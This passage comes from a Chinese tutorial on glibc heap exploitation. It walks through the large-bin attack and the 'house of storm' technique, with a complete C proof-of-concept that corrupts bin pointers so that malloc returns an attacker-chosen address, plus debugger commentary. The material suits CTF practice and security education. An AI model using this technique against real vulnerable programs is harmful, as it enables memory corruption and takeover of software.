<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 源码 */</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;    </span><br><span class="line">&#125;</span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line"><span class="comment">/* “译”码 */</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    P3-&gt;fd_nextsize = P2;</span><br><span class="line">    P3-&gt;bk_nextsize = P2-&gt;bk_nextsize; </span><br><span class="line">    P2-&gt;bk_nextsize = P3;</span><br><span class="line">    P3-&gt;bk_nextsize-&gt;fd_nextsize = P3; </span><br><span class="line">&#125;</span><br><span class="line">bck = P2-&gt;bk;</span><br></pre></td></tr></table></figure></div>
<p>即 stack_var2 &#x3D; p3。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 源码 */</span></span><br><span class="line"><span class="built_in">mark_bin</span> (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br><span class="line"><span class="comment">/* “译”码 */</span></span><br><span class="line"><span class="built_in">mark_bin</span>(av, victim_index);</span><br><span class="line">P3-&gt;bk = p2-&gt;bk;</span><br><span class="line">P3-&gt;fd = P2;</span><br><span class="line">P2-&gt;bk = P3;</span><br><span class="line">bck-&gt;fd = P3; <span class="comment">// bck 是原p2-&gt;bk(见上一段代码的bck)</span></span><br></pre></td></tr></table></figure></div>
<p>即 stack_var1 &#x3D; p3，至此利用完成，具体如何利用可看例题。</p>
<h2 id="house-of-storm"><a href="#house-of-storm" class="headerlink" title="house of storm"></a>house of storm</h2><p><code>glibc &lt; 2.29</code>，例题 <code>heap2storm</code> 结合 <code>ptmalloc</code> 源码讲的更为详细一些，这里简化了很多。</p>
<h3 id="源码-13"><a href="#源码-13" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC for House of Storm on 2.23</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">For 2.26-2.28, the tcache will need to</span></span><br><span class="line"><span class="comment">be full for this to work. After this,</span></span><br><span class="line"><span class="comment">a patch to the unsorted bin attack likely prevents this</span></span><br><span class="line"><span class="comment">technique from working.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This technique uses a combination of editing</span></span><br><span class="line"><span class="comment">the unsorted bin chunk and the large bin chunks</span></span><br><span class="line"><span class="comment">to write a &#x27;size&#x27; to a user choosen address in memory.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Once this has occurred, if the size at this &#x27;fake&#x27;</span></span><br><span class="line"><span class="comment">location is the same size as the allocation,</span></span><br><span class="line"><span class="comment">then the chunk will be returned back to the user.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This attack allows arbitrary chunks to be returned</span></span><br><span class="line"><span class="comment">to the user!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Written by Maxwell &quot;Strikeout&quot; Dulin</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> filler[<span class="number">0x10</span>];</span><br><span class="line"><span class="type">char</span> target[<span class="number">0x60</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// clearenv();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get the AMOUNT to shift over for size and the offset on the largebin.</span></span><br><span class="line"><span class="comment">// Needs to be a valid minimum sized chunk in order to work.</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">get_shift_amount</span><span class="params">(<span class="type">char</span>* pointer)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> shift_amount = <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ptr = (<span class="type">long</span> <span class="type">long</span>)pointer;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(ptr &gt; <span class="number">0x20</span>)&#123;</span><br><span class="line">                ptr = ptr &gt;&gt; <span class="number">8</span>;</span><br><span class="line">                shift_amount += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> shift_amount - <span class="number">1</span>; <span class="comment">// Want amount PRIOR to this being zeroed out</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> *unsorted_bin, *large_bin, *fake_chunk, *ptr;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;House of Storm&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Preparing chunks for the exploit&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Put one chunk into unsorted bin and the other into the large bin&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The unsorted bin chunk MUST be larger than the large bin chunk.&quot;</span>);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Putting a chunk into the unsorted bin and another</span></span><br><span class="line"><span class="comment">	into the large bin.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	unsorted_bin = <span class="built_in">malloc</span> ( <span class="number">0x4e8</span> );  <span class="comment">// size 0x4f0</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// prevent merging</span></span><br><span class="line">	<span class="built_in">malloc</span> ( <span class="number">0x18</span> );</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Find the proper chunk size to allocate.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Must be exactly the size of the written chunk from above.&quot;</span>);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Find the proper size to allocate</span></span><br><span class="line"><span class="comment">	We are using the first &#x27;X&#x27; bytes of the heap to act</span></span><br><span class="line"><span class="comment">	as the &#x27;size&#x27; of a chunk. Then, we need to allocate a</span></span><br><span class="line"><span class="comment">	chunk exactly this size for the attack to work.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	So, in order to do this, we have to take the higher</span></span><br><span class="line"><span class="comment">	bits of the heap address and allocate a chunk of this</span></span><br><span class="line"><span class="comment">	size, which comes from the upper bytes of the heap address.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	<span class="doctag">NOTE:</span></span></span><br><span class="line"><span class="comment">	- This does have a 1/2 chance of failing. If the 4th bit</span></span><br><span class="line"><span class="comment">	of this value is set, then the size comparison will fail.</span></span><br><span class="line"><span class="comment">	- Without this calculation, this COULD be brute forced.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="type">int</span> shift_amount = <span class="built_in">get_shift_amount</span>(unsorted_bin);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Shift Amount: %d\n&quot;</span>, shift_amount);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> alloc_size = ((<span class="type">size_t</span>)unsorted_bin) &gt;&gt; (<span class="number">8</span> * shift_amount);</span><br><span class="line">        <span class="keyword">if</span>(alloc_size &lt; <span class="number">0x10</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Chunk Size: 0x%lx\n&quot;</span>, alloc_size);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Chunk size is too small&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        alloc_size = (alloc_size &amp; <span class="number">0xFFFFFFFFE</span>) - <span class="number">0x10</span>; <span class="comment">// Remove the size bits</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;In this case, the chunk size is 0x%lx\n&quot;</span>, alloc_size);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Checks to see if the program will crash or not</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        The fourth bit of the size and the &#x27;non-main arena&#x27; chunk can NOT be set. Otherwise, the chunk. So, we MUST check for this first. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        Additionally, the code at https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3438</span></span><br><span class="line"><span class="comment">        validates to see if ONE of the following cases is true:</span></span><br><span class="line"><span class="comment">        - av == arena_for_chunk (mem2chunk (mem))</span></span><br><span class="line"><span class="comment">        - chunk is mmaped</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        If the &#x27;non-main arena&#x27; bit is set on the chunk, then the</span></span><br><span class="line"><span class="comment">        first case will fail.</span></span><br><span class="line"><span class="comment">        If the mmap bit is set, then this will pass.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        So, either the arenas need to match up (our fake chunk is in the</span></span><br><span class="line"><span class="comment">        .bss section for this demo. So, clearly, this will not happen) OR</span></span><br><span class="line"><span class="comment">        the mmap bit must be set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        The logic below validates that the fourth bit of the size</span></span><br><span class="line"><span class="comment">        is NOT set and that either the mmap bit is set or the non-main</span></span><br><span class="line"><span class="comment">        arena bit is NOT set. If this is the case, the exploit should work.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span>((alloc_size &amp; <span class="number">0x8</span>) != <span class="number">0</span> || (((alloc_size &amp; <span class="number">0x4</span>) == <span class="number">0x4</span>) &amp;&amp; ((alloc_size &amp; <span class="number">0x2</span>) != <span class="number">0x2</span>)))&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Allocation size has bit 4 of the size set or &quot;</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;mmap and non-main arena bit check will fail&quot;</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Please try again! :)&quot;</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Exiting...&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	large_bin  =  <span class="built_in">malloc</span> ( <span class="number">0x4d8</span> );  <span class="comment">// size 0x4e0</span></span><br><span class="line">	<span class="comment">// prevent merging</span></span><br><span class="line">	<span class="built_in">malloc</span> ( <span class="number">0x18</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// FIFO</span></span><br><span class="line">	<span class="built_in">free</span> ( large_bin );  <span class="comment">// put small chunks first</span></span><br><span class="line">	<span class="built_in">free</span> ( unsorted_bin );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Put the &#x27;large bin&#x27; chunk into the large bin</span></span><br><span class="line">	unsorted_bin = <span class="built_in">malloc</span>(<span class="number">0x4e8</span>);</span><br><span class="line">	<span class="built_in">free</span>(unsorted_bin);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	At this point, there is a single chunk in the</span></span><br><span class="line"><span class="comment">	large bin and a single chunk in the unsorted bin.</span></span><br><span class="line"><span class="comment">	It should be noted that the unsorted bin chunk</span></span><br><span class="line"><span class="comment">	should be LARGER in size than the large bin chunk</span></span><br><span class="line"><span class="comment">	but should still be within the same bin.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	In this setup, the large_bin has a chunk</span></span><br><span class="line"><span class="comment">	of size 0x4e0 and the unsorted bin</span></span><br><span class="line"><span class="comment">	has a chunk of size 0x4f0. This technique relies on</span></span><br><span class="line"><span class="comment">	the unsorted bin chunk being added to the same bin</span></span><br><span class="line"><span class="comment">	but a larger chunk size. So, careful heap feng shui</span></span><br><span class="line"><span class="comment">	must be done.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// The address that we want to write to!</span></span><br><span class="line">	fake_chunk = target - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Vulnerability! Overwrite unsorted bins &#x27;bk&#x27; pointer with our target location.\n This is our target location to get from the allocator&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The address of our fake chunk is set to the unsorted bin</span></span><br><span class="line"><span class="comment">	chunks &#x27;bk&#x27; pointer.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	This launches the &#x27;unsorted_bin&#x27; attack but it is NOT the</span></span><br><span class="line"><span class="comment">	main purpose of us doing this.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	After launching the &#x27;unsorted_bin attack&#x27; the &#x27;victim&#x27; pointer</span></span><br><span class="line"><span class="comment">	will be set to THIS address. Our goal is to find a way to get</span></span><br><span class="line"><span class="comment">	this address from the allocator.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Vulnerability!!</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	((<span class="type">size_t</span> *)unsorted_bin)[<span class="number">1</span>] = (<span class="type">size_t</span>)fake_chunk; <span class="comment">// unsorted_bin-&gt;bk</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Only needs to be a valid address.</span></span><br><span class="line">	(( <span class="type">size_t</span> *) large_bin )[<span class="number">1</span>]  =  (<span class="type">size_t</span>)fake_chunk  +  <span class="number">8</span> ;  <span class="comment">// large_bin-&gt;bk</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Later on, we will use WRITE-WHERE primitive in the large bin to write a heap pointer to the location&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;of your fake chunk.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Misalign the location in order to use the primitive as a SIZE value.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The &#x27;offset&#x27; changes depending on if the binary is PIE (5) or not PIE (2).&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Vulnerability #2!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Overwrite large bins bk-&gt;nextsize with the address to put our fake chunk size at.&quot;</span>);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	This can be seen as a WRITE-WHERE primitive in the large bin.</span></span><br><span class="line"><span class="comment">	However, we are going to write a &#x27;size&#x27; for our fake chunk using this.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	So, we set https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3579</span></span><br><span class="line"><span class="comment">	to an address for our fake size. The write above (bk_nextsize) is</span></span><br><span class="line"><span class="comment">	controlled via the pointer we are going to overwrite below. The</span></span><br><span class="line"><span class="comment">	value that gets written is a heap address; the unsorted bin</span></span><br><span class="line"><span class="comment">	chunk address above.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The &#x27;key&#x27; to this is the offset. First, we subtract 0x18 because</span></span><br><span class="line"><span class="comment">	this is the offset to writting to fd_nextsize in the code shown</span></span><br><span class="line"><span class="comment">	above. Secondly, notice the -2 below. We are going</span></span><br><span class="line"><span class="comment">	to write a &#x27;heap address&#x27; at a mis-aligned location and</span></span><br><span class="line"><span class="comment">	use THIS as the size. For instance, if the heap address is 0x123456</span></span><br><span class="line"><span class="comment">	and the pointer is set to 0x60006. This will write the following way:</span></span><br><span class="line"><span class="comment">	- 0x60006: 0x56</span></span><br><span class="line"><span class="comment">	- 0x60007: 0x34</span></span><br><span class="line"><span class="comment">	- 0x60008: 0x12</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Now, our &#x27;fake size&#x27; is at 0x60008 and is a valid size for the</span></span><br><span class="line"><span class="comment">	fake chunk at 0x60008. The fake size is CRUCIAL to getting this fake chunk</span></span><br><span class="line"><span class="comment">	from the allocator.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Second vulnerability!!!</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	(( <span class="type">size_t</span> *) large_bin)[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_chunk - <span class="number">0x18</span> - shift_amount; <span class="comment">// large_bin-&gt;bk_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	At this point, we&#x27;ve corrupted everything in just the right</span></span><br><span class="line"><span class="comment">	way so this should work.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The purpose of the attack is to have a corrupted &#x27;bk&#x27; pointer</span></span><br><span class="line"><span class="comment">	point to ANYWHERE we want and still get the memory back. We do</span></span><br><span class="line"><span class="comment">	this by using the large bin code to write a size to the &#x27;bk&#x27;</span></span><br><span class="line"><span class="comment">	location.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	This call to malloc (if you&#x27;re lucky), will return a pointer</span></span><br><span class="line"><span class="comment">	to the fake chunk that we created above.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Make allocation of the size that the value will be written for.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Once the allocation happens, the madness begins&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Once in the unsorted bin, the &#x27;large bin&#x27; chunk will be used in orer to &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;write a fake &#x27;size&#x27; value to the location of our target.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;After this, the target will have a valid size.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Next, the unsorted bin will see that the chunk (in unsorted_bin-&gt;bk) has a valid&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;size and remove it from the bin.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;With this, we have pulled out an arbitrary chunk!&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;String before: %s\n&quot;</span>, target);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;String pointer: %p\n&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">	ptr = <span class="built_in">malloc</span>(alloc_size);</span><br><span class="line">	<span class="built_in">strncpy</span>(ptr, <span class="string">&quot;\x41\x42\x43\x44\x45\x46\x47&quot;</span>, <span class="number">0x58</span> - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;String after %s\n&quot;</span>, target);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk ptr: %p\n&quot;</span>, ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-13"><a href="#调试-13" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010194123520.png"
                      alt="image-20231010194123520"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010194223371.png"
                      alt="image-20231010194223371"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010194317515.png"
                      alt="image-20231010194317515"
                ></p>
<p>首先布置堆结构，<code>get_shift_amount()</code>函数计算 <code>fake_chunk_size</code> 偏移，这个偏移一般来说，开了 <code>PIE</code> 为 <code>5</code>，不开 <code>PIE</code> 为 <code>2</code>。<code>alloc_size</code> 在经过与 <code>0xffffffffffe(111111111111111111111111111111111110)</code>取与运算后，<code>PREV_INUSE</code>位将被置为<code>0</code>，然后减去 <code>0x10</code>后变为需要申请的用户大小<code>0x50</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010195052740.png"
                     
                ></p>
<p>这里判断 <code>alloc_size</code> 是否符合要求。与 <code>0x8(1000)</code> 取与运算不为 <code>0</code> 说明不是 <code>fast_chunk</code> 大小，不符合要求； 与 <code>0x4(0100)</code> 取与运算等于<code>0x4</code> 则说明 <code>NON_MAIN_ARENA </code> 位为 <code>1</code> ，不属于主堆区，不符合要求；与 <code>0x2(0010)</code> 取与运算不等于 <code>0x2(0010)</code> 则说明 <code>IS_MAPPED</code> 位不等于为 <code>1</code> ，符合要求（绕个弯子）。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010200619889.png"
                      alt="image-20231010200619889"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010200749723.png"
                      alt="image-20231010200749723"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010200845852.png"
                      alt="image-20231010200845852"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010201137929.png"
                      alt="image-20231010201137929"
                ></p>
<p>接下来申请 <code>largebin_chunk</code> ，并将<code>unsorted_bin</code> 和 <code>large_bin</code> 两个堆块都放入 <code>unsorted bin</code> 中。再次申请 <code>0x4e8</code> 大小堆块并释放，会将 <code>0x4e1</code> 大小的堆块放入 <code>large_bin</code>，将 <code>0x4f1</code> 大小的堆块放进 <code>unsorted bin</code>，满足 <code>unsortedbin_chunk &gt; largebin_chunk</code> 并且在大小在同一区域内。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010201734234.png"
                      alt="image-20231010201734234"
                ></p>
<p>接下来完成任意地址申请，我们要控制 <code>target</code> 区域，在其 <code>fake_chunk=target-0x10</code> 位置申请。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">((<span class="type">size_t</span> *)unsorted_bin)[<span class="number">1</span>] = (<span class="type">size_t</span>)fake_chunk; <span class="comment">// unsorted_bin-&gt;bk</span></span><br><span class="line">(( <span class="type">size_t</span> *) large_bin )[<span class="number">1</span>]  =  (<span class="type">size_t</span>)fake_chunk  +  <span class="number">8</span> ;  <span class="comment">// large_bin-&gt;bk</span></span><br><span class="line">(( <span class="type">size_t</span> *) large_bin)[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_chunk - <span class="number">0x18</span> - shift_amount; <span class="comment">// large_bin-&gt;bk_nextsize</span></span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010201942670.png"
                      alt="image-20231010201942670"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010202458509.png"
                      alt="image-20231010202458509"
                ></p>
<p>构建如上图的堆结构，后面解释原因。</p>
<p>此时申请一个<code>0x50</code> 大小的堆块会经过以下两个变化。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">unsorted_chunks</span>(av)-&gt;bk = unsorted_chunk-&gt;bk;</span><br><span class="line">bck-&gt;fd = <span class="built_in">unsorted_chunks</span>(av);<span class="comment">// bck==fake_chunk</span></span><br></pre></td></tr></table></figure></div>

<p>即 <code>unsorted_chunks(av)-&gt;bk = fake_chunk</code>;<code>fake_chunk+0x10(fake_chunk_fd) = unsorted_chunks(av)</code></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* unsortedbin_chunks_size &gt; largebin_chunks_size 将执行如下代码 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">      victim-&gt;fd_nextsize = fwd; <span class="comment">//victim==unsortedbin_chunk; fwd == largebin_chunk;</span></span><br><span class="line">      victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">      fwd-&gt;bk_nextsize = victim;</span><br><span class="line">      victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line"></span><br><span class="line"><span class="built_in">mark_bin</span> (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure></div>

<p>然后执行如上代码，<code>unsorted_chunk_bk_nextsize</code> 首先指向 <code>fake_chunk-0x18-2</code> ，然后  <code>unsorted_chunk-&gt;bk_nextsize-&gt;fd_nextsize (fake_chunk-0x18-2+0x20)</code>  改为 <code>unsorted_chunk (此时fake_chunk的size被改为0x60)</code>。然后将 <code>bck(fake_chunk+0x8) </code>的 <code> fd(fake_chunk+0x8+0x10)</code> 指向 <code>unsorted_chunk</code>，伪造了 <code>fake_chunk_bk</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010204701287.png"
                      alt="image-20231010204701287"
                ></p>
<p> 最后成功向目标位置写入内容。</p>
